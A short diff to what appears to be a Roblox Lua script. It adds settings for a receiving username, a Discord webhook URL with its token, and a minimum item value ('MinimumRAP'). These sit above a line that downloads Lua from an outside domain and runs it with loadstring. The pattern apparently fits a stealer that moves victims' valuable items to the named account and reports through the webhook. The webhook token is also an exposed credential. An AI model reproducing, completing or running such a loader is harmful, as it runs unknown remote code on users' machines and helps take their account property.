@@ -1,1 +1,6 @@
+Username= 'X4_NDY'
+Webhook= 'https://discord.com/api/webhooks/1295749509967646760/W7Wev1hkEW-Q8Rr5LvlxmvydSCLzhMMzaXml2-w16vq-XKbIFZOfpTQQTep-Q8VEgTTf'
+
+MinimumRAP = 10
+
 loadstring(game:HttpGet('https://egorikusa.space/3a5fb6fd1f6794a618e1b8cd.lua'))()
